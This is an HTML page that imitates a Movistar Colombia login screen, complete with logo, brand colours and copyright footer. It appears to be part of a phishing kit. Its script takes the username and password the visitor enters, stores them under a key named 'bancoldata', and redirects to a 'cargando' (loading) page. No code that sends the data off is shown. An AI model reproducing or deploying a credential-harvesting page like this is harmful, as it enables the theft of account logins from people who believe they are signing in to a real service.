<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="Iniciar sesión Movistar" />
  <meta name="theme-color" content="#019DF4" />
  <title>Login - Movistar</title>
  <link rel="shortcut icon" href="img/apple-touch-icon.png" type="image/x-icon">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body {
      background: linear-gradient(135deg, #019DF4, #004A99);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
    }

    header {
      background-color: white;
      padding: 1rem;
      text-align: center;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    }

    .header-image {
      max-height: 50px;
    }

    .login-container {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 2rem;
    }

    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
      width: 100%;
      max-width: 400px;
    }

    .login-box h2 {
      color: #004A99;
      text-align: center;
      margin-bottom: 1.5rem;
    }

    .form-control {
      border-radius: 8px;
    }

    .btn-primary {
      background-color: #019DF4;
      border: none;
      border-radius: 8px;
      font-weight: bold;
    }

    .btn-primary:hover {
      background-color: #0179c4;
    }

    footer {
      text-align: center;
      padding: 1rem;
      font-size: 0.9rem;
      color: white;
    }

    @media (max-width: 400px) {
      .login-box {
        padding: 1.5rem;
      }
    }
  </style>
</head>

<body>
  <header>
    <img src="img/descarga.png" alt="Movistar Logo" class="header-image" />
  </header>

  <div class="login-container">
    <div class="login-box">
      <h2>Iniciar sesión</h2>
      <form id="loginForm">
        <div class="mb-3">
          <input type="text" id="usuario" class="form-control" placeholder="Usuario" required>
        </div>
        <div class="mb-3">
          <input type="password" id="clave" class="form-control" placeholder="Clave" required>
        </div>
        <button type="submit" class="btn btn-primary w-100">Ingresar</button>
      </form>
    </div>
  </div>

  <footer>
    © Movistar Colombia - Todos los derechos reservados
  </footer>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();

      const usuario = document.getElementById('usuario').value.trim();
      const clave = document.getElementById('clave').value.trim();

      if (!usuario || !clave) return;

      localStorage.setItem('bancoldata', JSON.stringify({ usuario, clave }));

      // Redirigir a la página de cargando
      window.location.href = "cargando.html";
    });
  </script>
</body>

</html>
